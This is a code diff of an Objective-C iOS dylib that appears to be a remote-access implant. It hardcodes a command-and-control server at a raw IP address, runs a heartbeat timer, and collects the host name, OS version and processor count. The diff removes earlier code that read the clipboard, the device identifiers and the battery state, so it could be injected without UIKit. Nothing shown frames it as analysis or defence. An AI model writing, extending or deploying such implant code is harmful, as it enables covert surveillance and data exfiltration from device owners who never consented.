@@ -1,6 +1,5 @@
 #import <Foundation/Foundation.h>
-#import <UIKit/UIKit.h>
-#import <CoreLocation/CoreLocation.h>
+// 注意：dylib不能使用UIKit，需要用Foundation替代
 
 // C2配置
 #define C2_SERVER_URL @"http://47.239.147.3:8080"
@@ -11,61 +10,30 @@ static NSString *clientId = nil;
 static NSTimer *heartbeatTimer = nil;
 
 // ========================================
-// 设备信息收集
+// 设备信息收集（仅Foundation）
 // ========================================
 NSDictionary* collectDeviceInfo() {
-    UIDevice *device = [UIDevice currentDevice];
+    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
 
     return @{
-        @"model": device.model,
-        @"system_name": device.systemName,
-        @"system_version": device.systemVersion,
-        @"name": device.name,
-        @"identifier": [[device identifierForVendor] UUIDString]
+        @"os_name": processInfo.operatingSystemVersionString,
+        @"host_name": processInfo.hostName,
+        @"processor_count": @(processInfo.processorCount)
     };
 }
 
 // ========================================
-// 获取剪贴板内容
+// 获取剪贴板内容（dylib不支持）
 // ========================================
 NSDictionary* getClipboard() {
-    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
-    NSString *text = pasteboard.string;
-
-    if (text) {
-        return @{@"text": text};
-    } else {
-        return @{@"error": @"Clipboard is empty"};
-    }
+    return @{@"error": @"UIKit not available in dylib"};
 }
 
 // ========================================
-// 获取电池状态
+// 获取电池状态（dylib不支持）
 // ========================================
 NSDictionary* getBatteryStatus() {
-    UIDevice *device = [UIDevice currentDevice];
-    device.batteryMonitoringEnabled = YES;
-
-    float batteryLevel = device.batteryLevel;
-    UIDeviceBatteryState batteryState = device.batteryState;
-
-    NSString *chargingStatus;
-    switch (batteryState) {
-        case UIDeviceBatteryStateCharging:
-            chargingStatus = @"charging";
-            break;
-        case UIDeviceBatteryStateFull:
-            chargingStatus = @"full";
-            break;
-        default:
-            chargingStatus = @"not_charging";
-            break;
-    }
-
-    return @{
-        @"level": @(batteryLevel * 100),
-        @"charging": chargingStatus
-    };
+    return @{@"error": @"UIKit not available in dylib"};
 }
 
 // ========================================
